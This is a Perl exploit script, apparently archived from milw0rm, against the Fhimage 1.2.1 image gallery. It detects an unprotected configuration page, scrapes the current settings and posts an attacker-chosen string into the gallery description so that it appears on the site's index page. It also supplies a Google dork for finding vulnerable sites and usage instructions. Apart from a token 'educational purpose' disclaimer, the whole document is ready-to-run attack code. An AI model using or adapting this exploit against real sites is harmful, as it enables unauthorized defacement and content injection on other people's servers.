<html><head><title>Fhimage 1.2.1 Remote Index Change Exploit</title></head><pre>#!/usr/bin/perl

# -----------------------------------------------------------------------------------------------
#                      INFORMATIONS
# -----------------------------------------------------------------------------------------------
# Fhimage 1.2.1
# http://www.flash-here.com/downloads/download.php?id=9
# Remote Index Change Exploit
# by Osirys
# osirys[at]live[dot]it
# osirys.org
# Thanks: x0r

# With this exploit, you will able to change index.php content

##   # ONLY FOR EDUCATIONAL PURPOSE. THE AUTHOR IS NOT RESPONSABLE OF ANY
##   # IMPROPERLY USE OF THIS EXPLOIT. USE IT AT YOUR OWN RISK !!

# Google Dork: FhImage, powered by Flash-here.com


use HTTP::Request;
use LWP::UserAgent;
use IO::Socket;

my $conf_path   = &quot;/imgconfig/index.php?mode=write&quot;;
my $index_PATH  = &quot;/index.php&quot;;


my $host   = $ARGV[0];
my $string_to_inj = $ARGV[1];

(($host)&amp;&amp;($string_to_inj)) || help(&quot;-1&quot;);
cheek($host) == 1 || help(&quot;-2&quot;);
&amp;banner;

$datas = get_input($host);
$datas =~ /(.*) (.*)/;
($h0st,$path) = ($1,$2);

$test_url = $host.$conf_path;
$test_re = get_req($test_url);

if ($test_re !~ /Config Settings/) {
    print &quot;[-] Configuration file not found, or insufficent permissions \n&quot;;
    print &quot;[-] Exploit failed ! \n&quot;;
    exit(0);
}
else {
    print &quot;[+] Configuration file found ! \n&quot;;

    get_old_data($test_url);
    my $url  = $path.$conf_path;

    my $post = &quot;g_title=&quot;.$t.&quot;&amp;g_desc=&quot;.$string_to_inj.&quot;&amp;g_bgcolor=&quot;.$g1.&quot;&amp;g_titlecolor=&quot;.$g2.&quot;&amp;g_&quot;.
               &quot;desccolor=&quot;.$g3.&quot;&amp;g_textcolor=&quot;.$g4.&quot;&amp;g_linkcolor=&quot;.$g5.&quot;&amp;g_vlinkcolor=&quot;.$g6.&quot;&amp;g_c&quot;.
               &quot;ols=&quot;.$g7.&quot;&amp;g_rows=&quot;.$g8.&quot;&amp;g_thumb_worh=&quot;.$g9.&quot;&amp;g_twidth=&quot;.$g10.&quot;&amp;g_spacing=&quot;. $g11.
               &quot;&amp;g_dispFn=check&amp;g_sortByFn=check&amp;g_insensitive_sort=check&amp;g_folderImg=&amp;g_popupWidt&quot;.
               &quot;h=400&amp;g_popupHeight=400&quot;;

    my $length = length($post);

    my $socket   =  new IO::Socket::INET(
                                          PeerAddr =&gt; $h0st,
                                          PeerPort =&gt; '80',
                                          Proto    =&gt; 'tcp',
                                        ) or die &quot;[-] Can't connect to $h0st:80\n[?] $! \n\n&quot;;

    my $data = &quot;POST &quot;.$url.&quot; HTTP/1.1\r\n&quot;.
               &quot;Host: &quot;.$h0st.&quot;\r\n&quot;.
               &quot;Keep-Alive: 300\r\n&quot;.
               &quot;Connection: keep-alive\r\n&quot;.
               &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;.
               &quot;Content-Length: &quot;.$length.&quot;\r\n\r\n&quot;.
               $post.&quot;\r\n&quot;;

    print &quot;[+] Chaning index content ..\n&quot;;
    $socket-&gt;send($data);

    while ((my $e = &lt;$socket&gt;)&amp;&amp;($inj_t != 1)) {
        if ($e =~ /Settings Saved/) {
            $inj_t = 1;
        }
    }

    $inj_t == 1 || die &quot;[-] Unable to change index content ! \n&quot;;
    &amp;expl_cheek;
}

sub expl_cheek {
    my $url = $host.$index_PATH;
    my $re = get_req($url);
    if ($re =~ /class=&quot;desc&quot;&gt;$string_to_inj&lt;\/div&gt;/) {
        print &quot;[+] Exploit succesfull !\n&quot;;
        print &quot;[+] Index changed, go and have a look !\n&quot;;
        exit(0);
    }
    else {
        print &quot;[-] Exploit failed\n&quot;;
        print &quot;[?] Something went wrong\n&quot;;
        exit(0);
    }
}

sub get_req() {
    $link = $_[0];
    my $req = HTTP::Request-&gt;new(GET =&gt; $link);
    my $ua = LWP::UserAgent-&gt;new();
    $ua-&gt;timeout(4);
    my $response = $ua-&gt;request($req);
    return $response-&gt;content;
}

sub cheek() {
    my $host = $_[0];
    if ($host =~ /http:\/\/(.*)/) {
        return 1;
    }
    else {
        return 0;
    }
}

sub get_input() {
    my $host = $_[0];
    $host =~ /http:\/\/(.*)/;
    $s_host = $1;
    $s_host =~ /([a-z.-]{1,30})\/(.*)/;
    ($h0st,$path) = ($1,$2);
    $path =~ s/(.*)/\/$1/;
    $full_det = $h0st.&quot; &quot;.$path;
    return $full_det;
}

sub get_old_data() {
    my $url = $_[0];
    my $re = &amp;get_req($url);
    if ($re =~ /name=&quot;g_title&quot; size=&quot;50&quot; value=&quot;(.*)&quot;&gt;/)                                                                 { $t = $1; }
    if ($re =~ /g_bgcolor'\)&quot; cols=&quot;7&quot; maxlength=&quot;7&quot; value=&quot;#([0-9a-zA-Z]{6})&quot;&gt;/)                                        { $g1 = &quot;\%23&quot;.$1; }
    if ($re =~ /g_titlecolor'\)&quot; cols=&quot;7&quot; maxlength=&quot;7&quot; value=&quot;#([0-9a-zA-Z]{6})&quot;&gt;/)                                     { $g2 = &quot;\%23&quot;.$1; }
    if ($re =~ /g_desccolor'\)&quot; cols=&quot;7&quot; maxlength=&quot;7&quot; value=&quot;#([0-9a-zA-Z]{6})&quot;&gt;/)                                      { $g3 = &quot;\%23&quot;.$1; }
    if ($re =~ /g_textcolor'\)&quot; cols=&quot;7&quot; maxlength=&quot;7&quot; value=&quot;#([0-9a-zA-Z]{6})&quot;&gt;/)                                      { $g4 = &quot;\%23&quot;.$1; }
    if ($re =~ /g_linkcolor'\)&quot; cols=&quot;7&quot; maxlength=&quot;7&quot; value=&quot;#([0-9a-zA-Z]{6})&quot;&gt;/)                                      { $g5 = &quot;\%23&quot;.$1; }
    if ($re =~ /g_vlinkcolor'\)&quot; cols=&quot;7&quot; maxlength=&quot;7&quot; value=&quot;#([0-9a-zA-Z]{6})&quot;&gt;/)                                     { $g6 = &quot;\%23&quot;.$1; }
    if ($re =~ /g_cols&quot; cols=&quot;50&quot; value=&quot;([0-9]{1,3})&quot;&gt; /)                                                               { $g7 = $1; }
    if ($re =~ /g_rows&quot; cols=&quot;50&quot; value=&quot;([0-9]{1,3})&quot;&gt; /)                                                               { $g8 = $1; }
    if (($re =~ /g_thumb_worh&quot; type=&quot;radio&quot; value=&quot;w&quot; checked &gt;/)&amp;&amp;($re =~ /g_twidth&quot; cols=&quot;50&quot; value=&quot;([0-9]{1,5})&quot;&gt;/)) { ($g9,$g10) = (&quot;w&quot;,$1); }
    if (($re =~ /g_thumb_worh&quot; type=&quot;radio&quot; value=&quot;h&quot; checked &gt;/)&amp;&amp;($re =~ /g_twidth&quot; cols=&quot;50&quot; value=&quot;([0-9]{1,5})&quot;&gt;/)) { ($g9,$g10) = (&quot;h&quot;,$1); }
    if ($re =~ /g_spacing&quot; type=&quot;text&quot; id=&quot;g_spacing&quot; value=&quot;([0-9]{1,5})&quot;&gt;/) { $g11 = $1; }
}

sub banner {
    print &quot;\n&quot;.
          &quot;  ----------------------------------------- \n&quot;.
          &quot;     Fhimage Remote Index Change Exploit    \n&quot;.
          &quot;                Coded by Osirys             \n&quot;.
          &quot;     [*] The author is not responsable      \n&quot;.
          &quot;                of any violation            \n&quot;.
          &quot;  ----------------------------------------- \n\n&quot;;
}

sub help() {
    my $error = $_[0];
    if ($error == -1) {
        &amp;banner;
        print &quot;\n[-] Bad hostname or missing string to inject! \n&quot;;
    }
    elsif ($error == -2) {
        &amp;banner;
        print &quot;\n[-] Bad hostname address !\n&quot;;
    }
    print &quot;[*] Usage : perl $0 http://hostname/cms_path string_to_inject\n\n&quot;;
    exit(0);
}

# milw0rm.com [2009-01-19]</pre></html>